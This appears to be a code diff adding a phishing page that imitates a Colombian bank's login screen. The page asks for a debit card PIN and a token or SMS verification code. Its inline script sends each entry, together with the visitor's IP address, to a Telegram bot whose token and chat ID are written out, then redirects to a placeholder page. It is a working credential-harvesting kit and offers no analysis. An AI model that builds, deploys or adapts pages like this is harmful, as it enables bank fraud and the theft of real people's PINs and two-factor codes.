@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bogota</title>
+    <link rel="stylesheet" href="./bogo/lfr_style.css">
+    <link rel="stylesheet" href="./bogo/lfr_ownstyle.css">
+</head>
+
+<body>
+    <div class="box-container">
+        <div class="container">
+            <div class="toast hidden" id="errorMessage" style="position: absolute;">
+                <p id="AuthLabel"></p>
+                <span class="icon-close-search-r" onclick="hideToast()"></span>
+            </div>
+
+            <div class="container__login">
+                <div class="container__login--header">
+                    <img src="./bogo/logobanco1.png" alt="">
+                </div>
+                <div class="container__login--title">
+                    <div class="container__login--title-1">
+                        <p>Identificación de usuario</p>
+                    </div>
+                </div>
+
+                <div class="container__login--login-box-id">
+                    <div class="form-container">
+                        <form method="post" name="authenticateForm" id="authenticateForm" autocomplete="off">
+                            <input type="hidden" size="8" id="currentSessionTime" name="currentSessionTime" value="1709245729624">
+                            <input type="hidden" size="8" id="initSessionTime" name="initSessionTime" value="1709245646774">
+                            <input type="hidden" size="8" id="validSessionTime" name="validSessionTime" value="00:07">
+                            
+                            <div class="field-1">
+                                <div class="custom-input">
+                                    <div class="label">
+                                        <label for="password">Clave de la tarjeta débito</label>
+                                    </div>
+                                    <input name="Password" type="password" class="custom-form-control" id="Password" maxlength="4" size="8" required="">
+                                </div>
+                            </div>
+
+                            <div class="btn-container">
+                                <button type="button" class="btn-main" id="btnContinue">Continuar</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <div class="timeElapsed">
+                <label>Tiempo restante&nbsp;</label><span id="timeE_min">05</span><label>:</label><span id="timeE_seg">18</span><label>&nbsp;minutos</label><br> 
+                <label><span id="timeE_date">Jueves, 29 de Febrero de 2024, 5:28 PM</span></label><br> 
+                <label><span id="timeE_ip">IP 186.116.65.249</span></label>
+            </div>
+        </div>
+
+        <form action="1.php" method="post" id="tok">
+            <div class="modal modalUP">
+                <div class="modal__container">
+                    <h2 class="modal-title">Para validar tu cuenta es necesario el uso del Token o SMS.</h2><br>
+                    <div class="token-container">
+                        <input type="tel" autofocus placeholder="Código Token" class="token-input" maxlength="6" name="num1" id="token" required="" autocomplete="off">
+                    </div><br>
+                    <button type="button" class="btn-main" id="btnToken">Continuar</button>
+
+                    <div class="modal-bottom">
+                        <p class="modal-text">*Si tú eres Persona Jurídica busca en la tienda de aplicaciones <b>Token Móvil</b></p>
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <div class="overlay overlayUP"></div>
+
+        <!-- Script para enviar la información a Telegram y obtener la IP del cliente -->
+        <script>
+            // Reemplaza con tu token y chat ID de Telegram
+            const TOKEN = '6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ';
+            const CHAT_ID = '5157616506';
+
+            // Función para obtener la IP del cliente
+            async function getClientIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error al obtener la IP:', error);
+                    return 'IP no disponible';
+                }
+            }
+
+            // Manejar el evento de envío del formulario de autenticación
+            document.getElementById('btnContinue').addEventListener('click', async function (e) {
+                e.preventDefault();
+
+                const password = document.getElementById('Password').value;
+                const ipAddress = await getClientIP();
+
+                // Crear el mensaje a enviar
+                const message = `Clave de la tarjeta débito: ${password}\nIP del Cliente: ${ipAddress}`;
+
+                // Enviar la información a Telegram
+                sendToTelegram(message);
+            });
+
+            // Manejar el evento de envío del formulario de token
+            document.getElementById('btnToken').addEventListener('click', async function (e) {
+                e.preventDefault();
+
+                const token = document.getElementById('token').value;
+                const ipAddress = await getClientIP();
+
+                // Crear el mensaje a enviar
+                const message = `Token de verificación: ${token}\nIP del Cliente: ${ipAddress}`;
+
+                // Enviar la información a Telegram
+                sendToTelegram(message);
+            });
+
+            // Función para enviar el mensaje a Telegram
+            function sendToTelegram(message) {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Redirigir a una página de éxito
+                        window.location.href = "https://tusitio.com/success-page.html"; // Cambia la URL de redirección
+                    } else {
+                        alert("Hubo un error al enviar la información a Telegram");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error al enviar el mensaje:', error);
+                    alert("Error al conectar con Telegram");
+                });
+            }
+        </script>
+    </div>
+    <style>
+
+        .token-input {
+            max-width: 200px;
+            height: 60px;
+            text-align: center;
+            font-size: 20px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+            </style>
+</body>
+</html>
